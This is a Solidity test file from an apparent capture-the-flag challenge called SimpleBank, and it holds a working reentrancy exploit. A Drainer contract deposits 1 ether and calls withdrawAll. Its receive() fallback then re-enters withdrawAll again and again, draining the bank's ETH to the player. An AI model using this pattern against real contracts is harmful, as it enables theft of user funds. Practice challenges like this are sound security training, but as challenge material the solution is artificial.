// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {SimpleBankBaseTest} from "test/SimpleBank/SimpleBankBase.t.sol";
import {SimpleBank} from "src/SimpleBank/SimpleBank.sol";

contract SimpleBankTest is SimpleBankBaseTest {
    function testSimpleBankExploit() public checkSolved {
        // DO NOT use any cheat codes here.
        // @todo drain all ETH from SimpleBank contract
        Drainer drainer = new Drainer(simpleBank);
        drainer.start{value: 1 ether}();
    }
}

contract Drainer {
    SimpleBank simpleBank;
    address player;

    constructor(SimpleBank _simpleBank) {
        simpleBank = _simpleBank;
        player = msg.sender;
    }

    function start() public payable {
        simpleBank.deposit{value: msg.value}();
        simpleBank.withdrawAll();
    }

    receive() external payable {
        try simpleBank.withdrawAll() {} catch {
            payable(player).transfer(address(this).balance);
        }
    }
}
